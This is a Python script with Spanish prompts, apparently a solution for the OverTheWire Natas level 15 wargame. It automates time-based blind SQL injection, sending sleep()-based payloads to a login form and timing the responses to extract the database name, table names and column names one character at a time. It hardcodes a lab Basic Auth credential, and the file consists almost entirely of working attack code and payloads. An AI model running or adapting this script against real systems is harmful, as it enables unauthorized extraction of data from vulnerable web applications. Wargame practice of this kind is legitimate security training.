#!/usr/bin/python3

import requests, time, sys, os, signal
import urllib3
urllib3.disable_warnings()

def ctrl_c(sig,frame):
	print("\n\n[*] Cerrando el programa...\n")
	sys.exit(1)
	
signal.signal(signal.SIGINT, ctrl_c)

result = ''
abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVXYZ0123456789'

url = 'http://natas15.natas.labs.overthewire.org/index.php'
headers = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}

r = ""
print("[+] Bienvenido a SQLIiTimeBased.py!")
print("""

1. Base de datos
2. Tablas
3. Columnas""")

while r != "1" and r != "2" and r != "3":
    r = input("\n[*] ¿Que dato desea obtener?: ")
    if r != "1" and r != "2" and r != "3":
       print("[X] Por favor introduzca 1, 2 o 3\n")

for i in range(1,16):
	print("\n---------------- [+] Letra nro:" + str(i) + "--------------------")
	for letra in abc:
		print("----- [..] Probando: "+letra)
		if r == "1":
			payload = f""" " or if(substr(database(),{i},1)='{letra}',sleep(3),1) -- -"""
		if r == "2":
			payload = f""" " or if(substr((select table_name from information_schema.tables where table_schema=database() limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
		if r == "3":
			payload = f""" " or if(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 1) limit 1),{i},1)={letra},sleep(3),1) -- -"""
		datos = { 'username' : payload}
		print(datos)
		time_old = time.time()
		response = requests.post(url, data=datos, headers=headers, verify=False)
		if response.status_code != 200:
			print("[-] EL SERVIDOR DEVUELVE UNA RESPUESTA DIFERENTE A 200")
			sys.exit(0)
		#print(r.text)
		time_new = time.time()
		seconds = time_new - time_old
		if seconds > 3:
			result += letra
			os.system('clear')
			print(" ----------- "+result+" ----------- ")
			break

		if letra == list(abc).pop():
			os.system('clear')
			if result != "":
				print("\n[+] Resultado: "+result)
			print("\n[-] NO SE ENCONTRARON MAS COINCIDENCIAS CON ESTA LISTA DE LETRAS")
			sys.exit(0)

print(f"Resultado: {result}")

#Nombre base de datos: payload = f"""' or if(substr(database(),{i},1)='{letra}',sleep(3),1) -- -"""

#Nombre tablas: payload = f"""' or if(substr((select table_name from information_schema.tables where table_schema=database() limit 1),{i},1)='{letra}',sleep(3),1) -- -"""

#Nombre columnas: payload = f"""' or if(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 1) limit 1),{i},1)={letra},sleep(3),1) -- -"""
